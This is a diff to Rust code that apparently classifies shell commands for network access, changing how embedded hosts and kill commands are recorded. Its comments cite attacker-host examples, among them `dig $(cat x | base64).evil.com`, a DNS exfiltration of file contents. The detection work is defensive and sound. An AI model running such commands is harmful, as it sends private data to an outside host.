@@ -314,7 +314,7 @@ fn classify_as_written(
     let substitution = in_place::substitution(&argv, program);
     push_command(cmd, &argv, program, substitution, ctx, sink)?;
     push_kill_substituted(program, words, sink)?;
-    kills::note(&argv, program, sink)?;
+    kills::note(&argv, program, words, sink)?;
     process_env::note(&argv, program, sink)?;
     wsl::note(&argv, ctx, sink)?;
 
@@ -547,13 +547,15 @@ fn classify_arguments(
             // or an argument of a program that names hosts (`curl 'evil.com'`).
             // Without a scheme and outside such a program, the word only looks like
             // one (`check_runs.0.id`, ADR-025).
-            sink.push(if fetch_only && fetch::fetchable_host(&host) {
-                AtomicAction::Fetch { host }
-            } else if tok.contains("://") || names_hosts {
-                AtomicAction::Net { host }
-            } else {
-                AtomicAction::NetWord { host }
-            })?;
+            for host in fetch::with_embedded(host, tok) {
+                sink.push(if fetch_only && fetch::fetchable_host(&host) {
+                    AtomicAction::Fetch { host }
+                } else if tok.contains("://") || names_hosts {
+                    AtomicAction::Net { host }
+                } else {
+                    AtomicAction::NetWord { host }
+                })?;
+            }
             continue;
         } else if names_hosts && let Some(host) = host::of_built_argument(program, tok) {
             // `dig $(cat x | base64).evil.com`: a name built at run time still
